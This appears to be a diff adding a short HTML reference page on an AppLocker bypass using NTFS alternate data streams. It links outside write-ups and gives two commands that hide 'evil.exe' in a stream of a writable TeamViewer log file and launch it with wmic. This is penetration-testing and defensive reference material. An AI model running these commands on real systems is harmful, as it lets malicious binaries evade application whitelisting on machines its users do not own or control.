@@ -1,0 +1,14 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Alternate Data Streams</title>
+</head><body>NTFS Alternate Data Streams (ADS)<br/>
+AppLocker rules does not stop things that execute in ADS. More info on that here: <a href="https://hitco.at/blog/howto-prevent-bypassing-applocker-using-alternate-data-streams/">https://hitco.at/blog/howto-prevent-bypassing-applocker-using-alternate-data-streams/</a>&nbsp;This means you can pipe data to a stream and execute it using many of the different methods: <a href="https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
+">https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f<br/>
+</a><br/>
+Example on adding binary to a writable file under program files (using ADS):<br/>
+<br/>
+type C:\temp\evil.exe &gt; "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"<br/>
+<br/>
+wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'</body></html>
